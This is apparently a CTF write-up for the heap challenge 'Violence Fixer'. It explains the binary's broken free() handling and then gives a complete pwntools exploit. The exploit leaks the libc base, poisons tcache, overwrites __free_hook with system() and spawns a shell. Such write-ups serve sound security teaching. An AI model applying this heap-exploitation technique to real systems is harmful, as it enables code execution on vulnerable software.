# Violence Fixer  

## Abstraction  
This binary is a really simplified heap management system. It tries to manage chunks in a heap without libc heap management system, but it collapses easily by free().  
  
## Bugs  
When you free a small chunk right before top, it would be connected to tcache. However, this system misrecognize that this chunks would be consolidated with top. In addition to it, when you free a chunk in the middle of heap, this system also collapses and just substructs the size of the freed chunk from top.  So there are so much vulnerability to pwn easily.  

## Rough Overview of Exploit  
You can easily leak the libcbase by reading the content of a freed unsorted chunk. And this system allows you to use an original heap management system only once in delegate(). So, you can use it to overwrite \_\_free\_hook into system().  

## Exploit
```python
#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import time

FILENAME = "../dist/violence-fixer"
LIBCNAME = "../dist/libc.so.6"

hosts = ("test","localhost","localhost")
ports = (32112,12300,32112)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ix):
  c.recvuntil("> ")
  c.sendline(str(ix))

def alloc(size,content):
  hoge(1)
  c.recvuntil("size: ")
  c.sendline(str(size))
  c.recvuntil("content: ")
  c.send(content)

def show(index):
  hoge(2)
  c.recvuntil("index: ")
  c.sendline(str(index))

def free(index):
  hoge(3)
  c.recvuntil("index: ")
  c.sendline(str(index))

def get_value(index):
  hoge(4)
  for i in range(index):
    c.recvuntil("INUSE")
  c.recvuntil("INUSE\n ")
  return c.recv(8)

def delegate(size,content):
  hoge(0)
  c.recvuntil("> ")
  c.sendline('y')
  c.recvuntil("size: ")
  c.sendline(str(size))
  c.recvuntil("content: ")
  c.send(content)

## exploit ###########################################

def exploit():
  global c
  c.recvuntil("?: ")
  c.sendline("y")

  # prepare
  alloc(0x200,"1"*0x30)
  alloc(0x200,"2"*0x30)
  alloc(0x200,"3"*0x30)
  alloc(0x200,"4"*0x30)
  alloc(0xa0,"5"*0x30)
  alloc(0x200,"4"*0x30)
  alloc(0x1e0,"4"*0x30)
  alloc(0x1e0,"4"*0x30) # TARGET
  alloc(0x1e0,"5"*0x30)
  alloc(0x1e0,p64(0x21)*(0x1e0//8))
  alloc(0x1e0,"7"*0x10)
  alloc(0xc0,"8"*0x10)
  alloc(0x10,"9"*0x10)

  # leak libcbase
  free(1)
  free(2)
  free(3)
  free(4)
  free(5)
  alloc(0x60,p8(0)*0x30 + p64(0) + p64(0x481))
  free(7)
  for i in range(4):
    alloc(0x10,p8(1))
  alloc(0x160,"A"*0x160)

  show(7)
  c.recvuntil("A"*0x160)
  libcbase = unpack(c.recvline().rstrip().ljust(8,'\x00')) - 0x1ebbe0
  print("[+]libcbase: "+hex(libcbase))

  # tcache duplicate
  alloc(0x1f0,p8(0))
  alloc(0x80,p8(0)) 

  alloc(0x60,"1"*0x8) # At this point, exeeds a real top
  alloc(0x50,"/bin/sh;\x00")
  alloc(0x50,"3"*0x8)
  alloc(0x20,"4"*0x8)
  alloc(0x20,"5"*0x8)
  alloc(0x20,"6"*0x8)
  alloc(0x20,"7"*0x8) # 
  free(0xf)
  free(0x13)
  free(0x15)
  alloc(0x130,p64(0)+p64(0x31)+"A"*0x80+p64(0)+p64(0x31)+p64(libcbase + libc.symbols["__free_hook"]))
  alloc(0x20,p8(0))
  delegate(0x20,p64(libcbase+libc.symbols["system"]))

  free(0x10)
  return

## main ##############################################

if __name__ == "__main__":
    global c
    start_time = time.time()
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])

    exploit()
    print("\n\n[!] exploit success: {} sec\n\n".format(time.time()-start_time))
    c.interactive()


```
